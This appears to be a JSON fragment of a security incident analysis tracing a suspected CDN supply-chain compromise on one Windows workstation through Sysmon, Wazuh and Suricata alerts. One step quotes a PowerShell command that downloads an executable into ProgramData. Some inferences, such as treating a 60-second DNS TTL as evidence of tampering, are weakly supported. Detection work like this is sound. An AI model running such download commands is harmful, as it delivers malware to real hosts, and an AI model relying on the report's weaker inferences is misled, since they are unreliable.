  "attack_progression": [
    {"step": 1, "tactic": "Reconnaissance — CDN hostname resolution", "technique": "T1584.005", "what_happened": "At 2026-09-17 09:12:04 CEST, Wazuh (Sysmon DNS event) on WIN-WKS-044 (10.20.15.44) logged a DNS query for 'updates.cdn-delivery.net'. The TTL returned was 60 seconds — abnormally low for a production CDN (typical CDN TTL is 300-86400 s). The low TTL indicates the CDN origin record has been recently manipulated, consistent with an attacker who compromised the CDN back-end or DNS zone and set a short TTL to facilitate rapid content swap.", "chain_reason": "Sysmon Event 22 (DNS query): data.win.eventdata.queryName=updates.cdn-delivery.net, agent.name=WIN-WKS-044.", "first_seen": "2026-09-17T09:12:04+0200"},
    {"step": 2, "tactic": "Resource Development — Payload hosted on compromised CDN", "technique": "T1584.005", "what_happened": "At 09:12:12 CEST, Suricata fired 'ET WEB_CLIENT Executable Download from CDN Path' (SID 2025697) on outbound HTTP GET from WIN-WKS-044 (10.20.15.44) to 104.18.22.97 via URL '/dist/v2/UpdateHelper.exe'. The Content-Type header returned was 'application/octet-stream' confirming binary delivery. The Suricata signature matches on the CDN URL path pattern and the response MIME type combination — the CDN hostname resolves legitimately but the specific path '/dist/v2/UpdateHelper.exe' now serves attacker content instead of the expected software update manifest.", "chain_reason": "Suricata SID 2025697: data.srcip=10.20.15.44, data.dstip=104.18.22.97, data.url=/dist/v2/UpdateHelper.exe, rule.description='ET WEB_CLIENT Executable Download from CDN Path'.", "first_seen": "2026-09-17T09:12:12+0200"},
    {"step": 3, "tactic": "Execution — PowerShell WebClient download to ProgramData", "technique": "T1059.001 + T1105", "what_happened": "At 09:13:07 CEST, Sysmon Event 1 (Process Create) on WIN-WKS-044 logged PowerShell.exe executing a WebClient download string. The commandLine was 'powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"(New-Object Net.WebClient).DownloadFile(\"https://updates.cdn-delivery.net/dist/v2/UpdateHelper.exe\",\"C:\\ProgramData\\UpdateHelper\\UpdateHelper.exe\")\"'. Custom Wazuh rule 92400 fired on the pattern: PowerShell WebClient download targeting a ProgramData subdirectory. Parent process was 'wscript.exe', indicating the PowerShell was spawned by a VBScript — likely delivered as an email attachment or web download earlier in the kill chain.", "chain_reason": "Sysmon Event 1: data.win.eventdata.image=powershell.exe, data.win.eventdata.commandLine contains 'Net.WebClient' + 'ProgramData', data.win.eventdata.parentImage=wscript.exe. Rule 92400 fired.", "first_seen": "2026-09-17T09:13:07+0200"},
    {"step": 4, "tactic": "Defense Evasion — PE magic bytes in CDN payload", "technique": "T1036 + T1105", "what_happened": "At 09:14:12 CEST, custom Wazuh rule 92401 fired on Sysmon Event 15 (FileCreateStreamHash): WIN-WKS-044 wrote a file to 'C:\\ProgramData\\UpdateHelper\\UpdateHelper.exe' whose first two bytes were 'MZ' (PE magic, 0x4D5A). The file extension '.exe' matches the PE header — this is a genuine PE binary, not a masqueraded script. The SHA256 hash logged by Sysmon was 'a3f8c2d1e4b70963f2a5c1d8e9b3a7f6d2c1e5b8a9f3d7c2e1b4a8f9d3c2e7b1'. Rule 92401 pattern: 'PE magic bytes (MZ) in file written by PowerShell/wscript to a monitored staging directory'.", "chain_reason": "Sysmon Event 15 (FileCreateStreamHash): data.win.eventdata.targetFilename=C:\\ProgramData\\UpdateHelper\\UpdateHelper.exe. Rule 92401 fired. SHA256=a3f8c2d1e4b70963f2a5c1d8e9b3a7f6d2c1e5b8a9f3d7c2e1b4a8f9d3c2e7b1.", "first_seen": "2026-09-17T09:14:12+0200"},
    {"step": 5, "tactic": "Persistence / Execution — Payload executed from ProgramData", "technique": "T1204.002 + T1547", "what_happened": "At 09:18:31 CEST, Sysmon Event 1 logged the execution of 'C:\\ProgramData\\UpdateHelper\\UpdateHelper.exe' with parentImage=wscript.exe and user=WIN-WKS-044\\jmartinez. The process was launched without command-line arguments — typical of a first-stage dropper or loader that self-configures via embedded config. Wazuh FIM simultaneously fired a file creation alert for 'C:\\ProgramData\\UpdateHelper\\UpdateHelper.exe' (syscheck.event=added), confirming the file was written and is now present on disk. The combination of wscript.exe parent + ProgramData staging + silent execution is the hallmark of a trojanized update delivered via supply-chain CDN compromise.", "chain_reason": "Sysmon Event 1: data.win.eventdata.image=C:\\ProgramData\\UpdateHelper\\UpdateHelper.exe, data.win.eventdata.parentImage=wscript.exe, data.win.eventdata.user=WIN-WKS-044\\jmartinez. FIM: syscheck.path=C:\\ProgramData\\UpdateHelper\\UpdateHelper.exe, syscheck.event=added.", "first_seen": "2026-09-17T09:18:31+0200"}
  ],
